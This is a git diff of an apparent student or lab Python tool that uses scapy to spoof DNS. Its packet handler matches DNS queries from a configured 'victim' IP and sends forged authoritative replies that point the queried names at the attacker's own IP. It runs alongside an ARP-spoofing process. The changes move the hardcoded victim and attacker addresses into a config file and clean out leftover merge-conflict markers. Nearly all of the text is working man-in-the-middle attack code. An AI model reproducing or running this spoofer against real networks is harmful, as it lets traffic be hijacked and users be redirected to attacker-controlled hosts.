@@ -25,13 +25,10 @@ import argparse
 import scapy
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS, DNSQR
-<<<<<<< Updated upstream
 import arpSpoof, scan
-=======
->>>>>>> Stashed changes
 
 operatingSystem = platform.system()
-victimIP = '192.168.0.19'
+variables = 0
 
 #-----------------------------------------------------------------------------
 #-- FUNCTION:       configSectionMap(section)
@@ -102,14 +99,15 @@ def default():
 #--
 #-----------------------------------------------------------------------------
 def parse(packet):
+    global variables
     if packet.haslayer(IP):
-        if packet[0][1].src == '192.168.0.19':
+        if packet[0][1].src == variables['victimip']:
             if packet.haslayer(DNS):
                 if DNSQR in packet:
                     packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
                                   UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                                   DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
-                                  an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata="192.168.0.18")))
+                                  an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=variables['ourip'])))
                     sendp(packetResponse, count=1, verbose=0)
 
 #-----------------------------------------------------------------------------
@@ -129,6 +127,7 @@ def firewallRule():
 #--
 #-----------------------------------------------------------------------------
 def main():
+    global variables
     forward()
     variables = configSectionMap('ARP')
     arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof
